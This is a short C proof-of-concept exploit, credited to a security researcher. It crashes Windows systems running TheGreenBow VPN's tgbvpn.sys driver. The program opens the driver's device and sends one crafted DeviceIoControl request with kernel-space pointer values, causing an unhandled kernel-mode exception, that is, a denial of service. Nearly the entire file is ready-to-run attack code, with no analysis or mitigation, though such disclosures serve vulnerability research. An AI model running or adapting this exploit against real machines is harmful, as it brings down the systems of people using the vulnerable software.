

/* tgbvpn.sys KERNEL_MODE_EXCEPTION_NOT_HANDLED - DoS PoC
* Author: Giuseppe 'Evilcry' Bonfa'
* E-Mail: evilcry {AT} gmail. {DOT} com
* Website: http://evilcry.netsons.org , http://evilcodecave.blogspot.com
* http://evilcodecave.wordpress.com , http://www.EvilFingers.com
* http://www.MalwareAnalytics.com [under construction]
*/

#include < windows.h>
#include < stdio.h>
#include < stdlib.h>

int main(void)
{
HANDLE hDevice;
DWORD Junk;
system("cls");
printf("\n .:: TheGreenBow DoS Proof of Concept ::.\n");
hDevice = CreateFileA("\\\\.\\tgbvpn",
0,
FILE_SHARE_READ | FILE_SHARE_WRITE,
NULL,
OPEN_EXISTING,
0,
NULL);

if (hDevice == INVALID_HANDLE_VALUE)
{
printf("\n Unable to Device Driver\n");
return EXIT_FAILURE;
}

DeviceIoControl(hDevice, 0x80000034,(LPVOID) 0x80000001, 0, (LPVOID) 0x80000002, 0, &Junk, (LPOVERLAPPED)NULL);

return EXIT_SUCCESS;
}


